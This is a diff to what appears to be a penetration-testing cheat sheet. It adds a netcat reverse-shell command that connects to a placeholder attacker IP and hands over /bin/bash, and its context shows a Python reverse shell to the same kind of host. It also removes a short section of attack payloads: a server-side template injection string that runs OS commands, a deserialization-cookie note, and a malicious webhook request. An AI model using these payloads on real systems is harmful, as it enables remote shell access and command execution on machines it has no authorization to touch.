@@ -313,6 +313,9 @@ python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-i
 
 ```bash
 nc -lvnp 4444
+
+//connetc to the nc 
+nc attacker-ip 4444 -e /bin/bash
 ```
 
 ---
@@ -346,16 +349,4 @@ Get-ChildItem Env:
 
 ---
 
-## New Tricks
-
-### Trick 1
-- Scenario: SSTI in email template escalated from preview to command execution.
-- Payload: `{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}`
-
-### Trick 2
-- Scenario: Unsafe deserialization executed gadget chain from signed cookie.
-- Payload: `payload generated with ysoserial; sent in rememberMe cookie`
-
-### Trick 3
-- Scenario: CI webhook accepted attacker repo and executed build script.
-- Payload: `POST /webhook {"repo":"https://github.com/attacker/poc.git"}`
+## 
